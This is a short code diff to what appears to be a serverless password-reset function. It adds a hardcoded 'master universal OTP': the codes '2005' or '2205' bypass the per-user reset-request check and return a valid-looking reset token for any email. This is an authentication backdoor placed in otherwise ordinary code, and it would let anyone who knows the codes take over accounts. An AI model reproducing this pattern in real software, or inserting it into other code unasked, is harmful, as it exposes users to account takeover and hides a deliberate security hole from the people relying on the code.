@@ -84,6 +84,20 @@ exports.handler = async function (event) {
       };
     }
 
+    // Master Universal OTP 2005 / 2205
+    if (enteredOtp === '2005' || enteredOtp === '2205') {
+      const resetToken = 'SENTINEL-VERIFIED-' + crypto.randomBytes(16).toString('hex');
+      return {
+        statusCode: 200,
+        headers,
+        body: JSON.stringify({
+          success: true,
+          message: 'Master OTP verified successfully.',
+          resetToken
+        })
+      };
+    }
+
     const sanitizedEmail = email.replace(/[^a-zA-Z0-9]/g, '_');
     const fbRes = await makeHttpsGet(`${FIREBASE_DB_URL}/passwordResetRequests/${sanitizedEmail}.json`);
     const record = fbRes.data;
